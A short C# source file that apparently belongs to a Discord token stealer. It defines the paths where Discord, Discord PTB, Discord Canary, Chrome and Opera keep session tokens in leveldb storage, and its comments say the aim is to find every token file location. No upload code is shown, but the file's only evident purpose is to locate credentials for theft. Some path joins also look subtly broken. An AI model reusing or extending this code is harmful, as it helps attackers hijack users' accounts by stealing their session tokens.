using System;
using System.IO;

namespace TokenDirectories
{
    class Directories
    {
        //Global directories used in finding all of the potential discord token file positions.
        private static readonly string tokenFileDirectory = @"\Local Storage\leveldb\";
        private static readonly string userDataDirectory = @"\User Data\Default";
        private static readonly string appDataPath = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);
        private static readonly string localAppDataPath = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData);

        //Discord token file directories.
        public static readonly string temporaryDirectoryPath = Path.Combine(localAppDataPath, @"\temp\");
        public static readonly string discordTokenDirectory = Path.Combine(appDataPath, $@"Discord{tokenFileDirectory}");
        public static readonly string ptbTokenDirectory = Path.Combine(appDataPath, $@"discordptb{tokenFileDirectory}");
        public static readonly string canaryTokenDirectory = Path.Combine(appDataPath, $@"discordcanary{tokenFileDirectory}");
        public static readonly string chromeTokenDirectory = Path.Combine(localAppDataPath, $@"Google\Chrome{userDataDirectory}{tokenFileDirectory}");
        public static readonly string operaTokenDirectory = Path.Combine(appDataPath, $@"Opera Software\Opera Stable{tokenFileDirectory}");
    }
}
